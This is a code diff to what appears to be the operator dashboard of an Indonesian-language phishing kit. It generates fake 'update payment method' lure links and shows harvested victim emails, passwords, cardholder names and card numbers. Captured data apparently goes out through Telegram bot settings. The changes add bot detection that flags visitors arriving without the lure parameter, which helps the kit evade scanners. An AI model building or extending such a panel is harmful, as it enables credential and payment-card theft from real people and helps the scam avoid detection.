@@ -17,11 +17,11 @@
             position: fixed;
             top: 50%; left: 50%;
             transform: translate(-50%, -50%);
-            opacity: 0.5;
+            opacity: 0.9;
             z-index: 0;
             pointer-events: none;
         }
-        .bg-logo img { width: 2500px; height: 2500px; }
+        .bg-logo img { width: 2000px; height: 2000px; }
         .wadah { position: relative; z-index: 1; max-width: 700px; margin: 0 auto; }
         .header { text-align: center; margin-bottom: 30px; }
         .header h1 { font-size: 26px; color: #1a1a1f; margin-bottom: 5px; }
@@ -35,11 +35,11 @@
         }
         .kotak h2 { font-size: 18px; margin-bottom: 18px; color: #222; border-bottom: 1px solid #eee; padding-bottom: 10px; }
         label { display: block; font-weight: 600; margin: 15px 0 6px; font-size: 14px; color: #333; }
-        input, textarea {
+        input {
             width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px;
             font-size: 14px; transition: border 0.2s;
         }
-        input:focus, textarea:focus { outline: none; border-color: #0071e3; }
+        input:focus { outline: none; border-color: #0071e3; }
         .tautan-hasil {
             background: #f5f5f7;
             padding: 12px;
@@ -75,6 +75,7 @@
             padding: 14px; background: #f8f9fa; border-radius: 6px; margin-bottom: 10px;
             border-left: 3px solid #0071e3; word-break: break-all; font-size: 13px; line-height: 1.8;
         }
+        .item.bot { border-left-color: #ff3b30; background: #fff2f2; }
         .item span { font-weight: 600; color: #333; display: inline-block; min-width: 90px; }
         .status-refresh {
             display: inline-block; margin-left: 10px; font-size: 12px; padding: 4px 10px;
@@ -85,6 +86,7 @@
         .baris-dua { display: flex; gap: 12px; }
         .baris-dua > div { flex: 1; }
         .kosong { color: #999; font-size: 13px; padding: 10px 0; }
+        .label-bot { color: #ff3b30; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -132,7 +134,8 @@
             <button class="salin-btn" onclick="salinTautan()">📋 Salin Tautan</button>
             <p class="info" style="margin-top:10px;">
                 Format: <code>?Update-payment-methode-EMAIL-ANGKA=aktif</code><br>
-                Ganti <strong>EMAIL</strong> dengan alamat tujuan, <strong>ANGKA</strong> otomatis
+                Ganti <strong>EMAIL</strong> dengan alamat tujuan, <strong>ANGKA</strong> otomatis<br>
+                <strong class="label-bot">⚠️ Tanpa parameter = terdeteksi BOT</strong>
             </p>
         </div>
 
@@ -168,15 +171,13 @@
         let intervalRefresh = null;
         const INTERVAL_DETIK = 10;
 
-        // === MUAT SEMUA SAAT BUKA HALAMAN ===
+        // === MUAT SAAT BUKA ===
         document.addEventListener('DOMContentLoaded', function() {
-            // Pengaturan dasar
             document.getElementById('websiteUrl').value = localStorage.getItem('websiteUrl') || '';
             document.getElementById('emailTujuan').value = localStorage.getItem('emailTujuan') || '';
             document.getElementById('botToken').value = localStorage.getItem('botTokenTelegram') || '';
             document.getElementById('chatIdTelegram').value = localStorage.getItem('chatIdTelegram') || '';
             
-            // Nomor acak & parameter — TETAP TERSIMPAN
             const simpanAngka = localStorage.getItem('paramAngka');
             if (simpanAngka) document.getElementById('paramAngka').value = simpanAngka;
             
@@ -185,7 +186,7 @@
             buatTautan();
         });
 
-        // === SIMPAN OTOMATIS PENGATURAN ===
+        // === SIMPAN OTOMATIS ===
         function simpanOtomatis() {
             localStorage.setItem('websiteUrl', document.getElementById('websiteUrl').value.trim());
             localStorage.setItem('emailTujuan', document.getElementById('emailTujuan').value.trim());
@@ -195,25 +196,21 @@
             const pesan = document.getElementById('pesanBerhasil');
             pesan.style.display = 'block';
             setTimeout(() => pesan.style.display = 'none', 1500);
-            
             buatTautan();
         }
 
-        // === SIMPAN ANGKA + BUAT TAUTAN ===
         function simpanAngkaLaluBuat() {
             localStorage.setItem('paramAngka', document.getElementById('paramAngka').value.trim());
             buatTautan();
         }
 
-        // === BUAT ANGKA ACAK ===
         function acakAngka() {
             const acak = Math.floor(Math.random() * 900000) + 100000;
             document.getElementById('paramAngka').value = acak;
-            localStorage.setItem('paramAngka', acak); // Langsung simpan
+            localStorage.setItem('paramAngka', acak);
             buatTautan();
         }
 
-        // === BUAT TAUTAN ===
         function buatTautan() {
             const url = document.getElementById('websiteUrl').value.trim();
             const angka = document.getElementById('paramAngka').value.trim();
@@ -223,11 +220,9 @@
                 hasil.innerHTML = '<span style="color:#888;">Isi nomor di atas...</span>';
                 return;
             }
-            
             hasil.innerHTML = `${url}/?Update-payment-methode-EMAIL-${angka}=aktif`;
         }
 
-        // === SALIN TAUTAN ===
         function salinTautan() {
             const teks = document.getElementById('tautanHasil').innerText;
             if (!teks.includes('Isi')) {
@@ -237,7 +232,6 @@
             }
         }
 
-        // === REFRESH OTOMATIS ===
         function toggleRefreshOtomatis() {
             const tombol = document.getElementById('tombolRefreshOtomatis');
             const status = document.getElementById('statusRefresh');
@@ -263,7 +257,7 @@
             }
         }
 
-        // === TAMPILKAN DATA — DIPERBAIKI ===
+        // === TAMPILKAN DATA ===
         function tampilkanDataMasuk() {
             // Data Login
             const daftarLogin = document.getElementById('daftarLogin');
@@ -273,7 +267,8 @@
                 daftarLogin.innerHTML = '<p class="kosong">Belum ada data...</p>';
             } else {
                 daftarLogin.innerHTML = dataLogin.map(d => `
-                    <div class="item">
+                    <div class="item ${d.isBot ? 'bot' : ''}">
+                        ${d.isBot ? '<span class="label-bot">🤖 BOT</span><br>' : ''}
                         <span>📧 Email:</span> ${d.email || '-'}<br>
                         <span>🔑 Kata Sandi:</span> ${d.sandi || '-'}<br>
                         <span>🕐 Waktu:</span> ${d.waktu || '-'}
@@ -289,7 +284,8 @@
                 daftarKartu.innerHTML = '<p class="kosong">Belum ada data...</p>';
             } else {
                 daftarKartu.innerHTML = dataKartu.map(d => `
-                    <div class="item">
+                    <div class="item ${d.isBot ? 'bot' : ''}">
+                        ${d.isBot ? '<span class="label-bot">🤖 BOT</span><br>' : ''}
                         <span>📧 Email:</span> ${d.email || '-'}<br>
                         <span>👤 Nama:</span> ${d.namaKartu || '-'}<br>
                         <span>🔢 Kartu:</span> ${d.nomorKartu || '-'}<br>
